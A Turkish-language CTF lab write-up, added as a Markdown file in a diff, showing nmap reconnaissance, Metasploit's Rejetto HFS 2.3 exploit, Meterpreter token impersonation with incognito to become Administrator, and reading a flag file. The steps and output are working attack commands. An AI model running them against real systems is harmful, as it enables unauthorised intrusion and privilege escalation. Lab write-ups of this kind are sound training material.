@@ -1,0 +1,50 @@
+# 🛡️ Privilege Escalation - Rejetto HFS Exploit + Token Impersonation
+
+Bu çalışmada, bir CTF senaryosunda `Rejetto HFS v2.3` çalıştıran bir Windows makineye karşı exploit kullanılarak sistem erişimi sağlanmış ve ardından `incognito` modülü ile **Administrator** kullanıcısının token'ı taklit edilerek bayrak elde edilmiştir.
+
+## 🎯 Amaç
+
+1. Hedef sistemdeki zafiyeti tespit etmek.
+2. `Metasploit` kullanarak exploit çalıştırmak.
+3. `incognito` modülü ile Administrator yetkisini taklit ederek **privilege escalation** gerçekleştirmek.
+4. Bayrağa (flag) ulaşmak.
+
+---
+
+## 🔍 1. Bilgi Toplama – Nmap
+
+```bash
+nmap -sV -p 80 demo.ine.local
+Nmap scan report for demo.ine.local (10.2.25.81)
+Host is up (0.0031s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+🚀 2. Exploit Çalıştırma – Metasploit
+msfconsole -q
+use exploit/windows/http/rejetto_hfs_exec
+set RHOSTS demo.ine.local
+exploit
+✅ Başarılı exploit sonrası:
+meterpreter > getuid
+Server username: ATTACKDEFENSE\rejetto
+
+🕵️‍♂️ 3. Privilege Escalation – Token Impersonation
+meterpreter > load incognito
+meterpreter > list_tokens -u
+Çıktı:
+Delegation Tokens Available
+========================================
+ATTACKDEFENSE\Administrator
+
+Taklit (impersonate) işlemi:
+impersonate_token ATTACKDEFENSE\\Administrator
+getuid
+Server username: ATTACKDEFENSE\Administrator
+Artık sistemde tam yetkili kullanıcıyız.
+
+🎯 4. Flag Dosyasını Alma
+cat C:\\Users\\Administrator\\Desktop\\flag.txt
+📌 Flag başarıyla elde edilmiştir.
